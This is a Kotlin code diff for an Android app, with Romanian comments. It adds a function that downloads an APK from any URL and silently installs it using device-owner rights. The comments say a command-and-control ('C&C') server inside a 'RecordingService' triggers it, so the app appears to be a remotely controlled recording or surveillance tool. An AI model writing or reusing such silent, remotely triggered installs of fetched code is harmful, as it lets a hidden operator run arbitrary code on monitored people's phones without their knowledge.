@@ -76,4 +76,35 @@ object AppUpdater {
             }
         }.start()
     }
+
+    /**
+     * Varianta din Context (fara Activity) — pentru update declansat de C&C in RecordingService.
+     * Ruleaza SINCRON pe thread-ul apelantului (deja background). Device-owner -> instalare silentioasa.
+     * Intoarce true daca sesiunea de instalare a fost commit-uita (instalarea continua in fundal).
+     */
+    fun downloadAndInstallCtx(ctx: Context, apkUrl: String): Boolean {
+        return try {
+            val conn = (URL(apkUrl).openConnection() as HttpURLConnection).apply {
+                connectTimeout = 15000; readTimeout = 180000; instanceFollowRedirects = true
+            }
+            conn.inputStream.use { input ->
+                val pi = ctx.packageManager.packageInstaller
+                val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
+                val sessionId = pi.createSession(params)
+                pi.openSession(sessionId).use { session ->
+                    session.openWrite("apk", 0, -1).use { out ->
+                        input.copyTo(out, 65536); session.fsync(out)
+                    }
+                    val mutable = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                        PendingIntent.FLAG_MUTABLE else 0
+                    val pending = PendingIntent.getBroadcast(
+                        ctx, sessionId, Intent(ctx, InstallReceiver::class.java),
+                        PendingIntent.FLAG_UPDATE_CURRENT or mutable)
+                    session.commit(pending.intentSender)
+                }
+            }
+            conn.disconnect()
+            true
+        } catch (_: Exception) { false }
+    }
 }
